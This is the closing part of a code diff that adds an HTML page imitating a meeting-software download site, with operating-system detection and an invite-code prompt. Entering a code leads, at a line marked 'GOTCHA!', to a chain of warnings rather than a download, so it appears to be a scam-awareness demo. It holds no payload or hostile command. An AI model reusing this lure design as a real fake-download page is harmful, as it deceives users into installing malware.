+            desc.textContent = 'Enter the meeting code shared by the host';
+            osSelector.style.display = 'none';
+        }
+
+        modal.classList.add('active');
+    }
+
+    function attemptDownload() {
+        const code = document.getElementById('invite-code').value;
+        if (!code.trim()) {
+            document.getElementById('invite-code').style.borderColor = 'var(--red)';
+            document.getElementById('invite-code').placeholder = 'You need an invite code!';
+            return;
+        }
+
+        // GOTCHA! Switch to warning chain
+        document.getElementById('modal').classList.remove('active');
+        document.getElementById('landing').style.display = 'none';
+        document.getElementById('warnings').classList.add('active');
+        window.scrollTo(0, 0);
+    }
+
+    function showStep(n) {
+        const step = document.getElementById('step-' + n);
+        if (step) {
+            step.classList.add('visible');
+            step.style.animation = 'slideIn 0.5s ease-out';
+            step.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }
+    }
+
+    // Initial OS detection
+    selectOS(detectOS());
+
+    // Close modal on overlay click
+    document.getElementById('modal').addEventListener('click', function(e) {
+        if (e.target === this) this.classList.remove('active');
+    });
+
+    // Enter key in invite code field
+    document.getElementById('invite-code').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') attemptDownload();
+    });
+</script>
+
+</body>
+</html>
